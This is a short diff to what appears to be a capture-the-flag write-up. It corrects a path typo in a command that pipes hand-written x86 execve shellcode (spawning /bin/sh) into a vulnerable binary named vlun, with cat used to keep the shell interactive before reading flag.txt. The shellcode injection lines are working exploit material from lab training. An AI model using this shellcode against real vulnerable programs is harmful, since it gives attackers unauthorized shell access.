@@ -58,6 +58,6 @@ $ python -c 'import pwn; print(pwn.shellcraft.linux.sh())'|.vlun
 We can see that the shell has been invoked but inside vlun, and we lost the interaction with it. 
 So we need to keep the interaction with it, John Hammond did that using cat [here](https://www.youtube.com/watch?v=Nn0fUJuQEsk&list=PL1H1sBF1VAKUmJio8DWjY0tHLwf3bl2ku&index=6). 
 ```
-$ (python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")';cat)|.vlun
+$ (python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")';cat)|./vlun
 ```
 simply then cat the flag.txt.
